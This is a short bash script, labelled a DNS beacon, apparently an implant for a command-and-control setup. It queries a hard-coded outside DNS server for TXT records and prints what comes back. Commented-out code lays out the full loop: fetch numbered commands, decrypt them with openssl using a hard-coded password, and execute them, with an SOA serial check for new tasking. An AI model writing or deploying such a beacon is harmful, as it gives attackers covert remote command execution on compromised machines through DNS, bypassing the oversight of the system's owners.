#!/bin/bash
# Beacon to DNS server 

domain="dosh.cloud"
current=0
pass="c2FuZHRvbWIK"
dnsServer="129.21.130.212"

# Pull down commands from server
pull(){

    # Get number of commands to query for
    #num=$(dig @$dnsServer -t txt +short num.dosh.cloud)
    cmd=$(dig @$dnsServer -t txt +short doshcloud.com)
    #num=$(echo ${num:1:len-2})
    len=$(echo ${#cmd})
    cmd=$(echo ${cmd:1:len-2})
    echo $cmd
    #test=(echo $cmd | openssl zlib -d)
    #echo $test
    # Loop through gathering each command and executing
    #:'x=1
    #while [ $x -le $num ]; do
     #   cmd=$(dig @$dnsServer  -t txt +short $x.$domain)
     #   len=$(echo ${#cmd})
     #   # Remove quotations
     #   cmd=$(echo ${cmd:1:len-2})

        # Decode the command
      #  cmd=$(echo $cmd | openssl enc -aes-256-cbc -d -a -k $pass)
      #  $cmd

       # let x=x+1
    #done'
}

check(){
    serial=$(dig @$dnsServer -t soa +short $domain | awk '{print $3}')
    echo $serial
}


# Main driver for beacon
main(){
    #new=$(check)
    #if [ $new -gt $current ]; then
    #    pull
    #fi
    pull
}

main
